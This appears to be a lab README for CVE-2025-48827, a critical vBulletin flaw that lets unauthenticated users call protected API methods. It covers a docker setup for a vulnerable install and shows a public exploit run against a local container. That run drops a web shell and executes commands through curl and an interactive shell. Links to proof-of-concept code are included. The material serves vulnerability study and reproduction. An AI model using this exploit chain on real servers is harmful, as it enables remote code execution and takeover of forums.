# CVE-2025-48827
vBulletin 5.0.0 through 5.7.5 and 6.0.0 through 6.0.3 allows unauthenticated users to invoke protected API controllers' methods when running on PHP 8.1 or later, as demonstrated by the /api.php?method=protectedMethod pattern, as exploited in the wild in May 2025.

## Notes

## Metrics
Base Score: 10.0 (CRITICAL) 

## Vulnerability Environment
Build and run:
```bash
docker compose build
docker compose up -d
```
Stop Environment and remove network:
```bash
docker compose down
```
## Detection and exploitation example
### Setup vBulletin manualy
1. Up compose Environment
2. Go to container_ip:80
3. Set common config:
    - DB_HOST: "db"
    - DB_NAME: "vulnforum"
    - DB_USER: "vbulletin"
    - DB_PASSWORD: "vbulletin"
    - EMAIL: any 
    - Other option: default
4. Remove makeconfig.php:
```shell
docker exec -it <container_id> rm core/install/makeconfig.php
```
5. Add new user
6. While you open Admin panel, you got an error:
```shell
docker exec -it <container_id> mv core/install/ core/install.bak
```

### Use exploit by 0xgh057r3c0n
```shell
git clone https://github.com/0xgh057r3c0n/CVE-2025-48827

python3 vbulletin.py http://172.90.240.2/

      __________      .__  .__          __  .__      ___________________ _______>
___  _\______   \__ __|  | |  |   _____/  |_|__| ____\______   \_   ___ \\_   __>
\  \/ /|    |  _/  |  \  | |  | _/ __ \   __\  |/    \|       _/    \  \/ |    _>
 \   / |    |   \  |  /  |_|  |_\  ___/|  | |  |   |  \    |   \     \____|     >
  \_/  |______  /____/|____/____/\___  >__| |__|___|  /____|_  /\______  /______>
              \/                     \/             \/       \/        \/       >

                             vBulletin RCE - Web Shell Dropper by 0xgh057r3c0n

[+] RCE payload injected.
[+] shell.php dropped at: http://172.90.240.2/shell.php
[!] Launch commands like:
    curl 'http://172.90.240.2/shell.php?cmd=whoami'

[!] Entering interactive mode (type 'exit' to quit)
(shell:.)$ whoami
[DEBUG] Full response:
www-data
```

## Exploits and PoCs
https://github.com/0xgh057r3c0n/CVE-2025-48827  
https://karmainsecurity.com/pocs/vBulletin-replaceAdTemplate-RCE.php  

## Nuclei Template

## CTF Rooms

## References
[NIST: CVE-2025-48827](https://nvd.nist.gov/vuln/detail/CVE-2025-48827)  
[karmainsecurity: Don't Call That "Protected" Method: Dissecting an N-Day vBulletin RCE](https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce)  
[Quick Overview: Installing vBulletin](https://forum.vbulletin.com/forum/vbulletin-6/installation-upgrades/4483267-quick-overview-installing-vbulletin)  
